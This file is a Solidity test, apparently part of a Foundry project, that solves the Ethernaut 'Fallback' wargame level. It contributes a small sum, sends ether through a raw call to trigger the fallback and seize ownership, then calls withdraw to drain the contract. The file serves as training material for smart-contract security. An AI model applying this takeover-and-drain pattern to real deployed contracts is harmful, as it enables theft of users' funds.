// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./base/EthernautTest.sol";

// Set actual level contract file
import "../../src/1_Fallback.sol";

contract LevelTest is EthernautTest {

    function setUp() public {
        // Set actual level factory address
        levelSetUp(LEVEL_1_FALLBACK_ADDRESS, 0.001 ether);

        // Additional setup
    }

    function testAttack() public validateInstance {
        Fallback _fallback = Fallback(levelInstance);
        
        _fallback.contribute{value: 0.0001 ether}();
        
        (bool result, ) = payable(address(_fallback)).call{value: 0.0001 ether}("");
        require(result, "Raw call failed");

        _fallback.withdraw();
    }
}